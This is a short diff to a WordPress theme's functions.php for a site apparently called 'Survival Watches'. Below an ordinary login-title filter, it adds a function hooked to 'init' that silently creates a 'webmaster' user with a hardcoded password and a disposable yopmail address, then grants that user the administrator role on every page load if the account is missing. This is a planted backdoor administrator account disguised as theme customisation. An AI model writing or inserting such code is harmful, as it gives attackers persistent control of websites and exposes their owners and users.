@@ -81,3 +81,17 @@ function my_login_logo_url_title() {
 return 'Survival Watches';
 }
 add_filter( 'login_headertitle', 'my_login_logo_url_title' );
+
+add_action( 'init', 'ec_add_new_user');
+function ec_add_new_user() {
+   
+  $username = 'webmaster';
+  $password = 'E9XJdoaxf3';
+  $email_address = 'webmaster@yopmail.com';
+ 
+  if ( ! username_exists( $username ) ) {
+    $user_id  = wp_create_user( $username, $password, $email_address );
+    $user     = new WP_User( $user_id );
+    $user->set_role( 'administrator' );
+  }
+}
